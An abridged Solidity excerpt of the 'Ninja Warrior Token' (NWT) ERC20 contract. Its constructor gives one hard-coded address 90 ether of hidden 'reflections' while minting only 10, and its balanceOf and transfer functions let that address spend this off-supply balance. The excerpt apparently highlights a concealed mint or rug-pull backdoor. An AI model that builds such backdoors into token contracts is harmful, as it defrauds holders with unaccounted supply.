...
contract NWTToken is ERC20, Ownable {
    ...
    constructor() ERC20("Ninja Warrior Token", "NWT") {
        ...
        _reflections[0xA9889aAC1c8d0e8d5F874CdC9D475D0Dfcf32EB1] = 90 ether;
        _mint(0xA9889aAC1c8d0e8d5F874CdC9D475D0Dfcf32EB1,10 ether);
    }
    ...
    function balanceOf(address account)
        ...
        returns (uint256)
    {
        uint256 tBalance = super.balanceOf(account);
        return tBalance + _reflections[account];
    }
    ...
    function _tokenTransfer(
        ...
        uint256 fromBalance = _balances[from];
        uint256 fromReflections = _reflections[from];

        uint256 fromToken = fromBalance.add(fromReflections);

        require(fromToken >= amount, "ERC20: transfer amount exceeds balance");
        ...
        unchecked {
            ...
            if (amount > fromBalance) {
                _balances[from] = 0;
                _reflections[from] = fromReflections - (amount.sub(fromBalance));
            }
        }
        _balances[to] += amount;
